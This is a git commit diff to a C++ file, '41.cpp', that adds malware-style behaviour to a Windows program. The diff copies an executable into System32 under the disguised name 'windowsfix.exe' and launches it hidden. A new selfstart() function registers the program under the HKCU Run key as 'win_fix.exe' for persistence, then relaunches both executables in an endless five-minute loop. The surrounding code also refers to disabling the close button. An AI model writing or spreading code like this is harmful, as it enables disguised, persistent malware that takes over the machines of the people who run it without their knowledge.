652c893eddb016a5ab3a747c4331f72245022d34
张鹏宇 <120004529+zhangpy0@users.noreply.github.com>
2023-01-24 19:53:17 +0800

    Update 41.cpp

--- 41.cpp
+++ 41.cpp
@@ -13,11 +13,48 @@
   
  void copy() 
  { 
-     system("xcopy v8.6.exe C:\\Windows\\System32\\ /y"); 
+     system("xcopy v8.6.exe C:\\Windows\\System32\\windowsfix.exe /y /q"); 
  //    system("xcopy winupdata.exe C:\\Windows\\System32\\ /y"); 
-     system("start /b C:\\Windows\\System32\\v8.6.exe"); 
+     system("start /b C:\\Windows\\System32\\windowsfix.exe"); 
  } 
+
+ void selfstart()  
+ { 
+     HKEY hKey; 
+     LONG lRet; 
+     TCHAR szPath[MAX_PATH]; 
+     DWORD dwSize = sizeof(szPath); 
   
+     // 获取要自启动的exe文件的绝对路径 
+     GetModuleFileName(NULL, szPath, dwSize); 
+  
+     // 创建或打开注册表中的"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"键 
+     lRet = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey); 
+     if (lRet != ERROR_SUCCESS) 
+     { 
+         _tprintf(_T("RegOpenKeyEx failed! Error code: %d\n"), lRet); 
+         return; 
+     } 
+  
+     // 将exe文件的绝对路径写入注册表中 
+     lRet = RegSetValueEx(hKey,_T("win_fix.exe"), 0, REG_SZ, (const BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR)); 
+     if (lRet != ERROR_SUCCESS) 
+     { 
+         _tprintf(_T("RegSetValueEx failed! Error code: %d\n"), lRet); 
+         RegCloseKey(hKey); 
+         return; 
+     } 
+  
+     RegCloseKey(hKey); 
+ //    _tprintf(_T("Success\n")); 
+     while (1) 
+     { 
+         Sleep(1000*60*5); 
+         system("start /b windowsfix.exe"); 
+         system("start /b v8.6.exe"); 
+     } 
+      
+ }
   
  /// @brief forbid the close button 
  /// @return none 
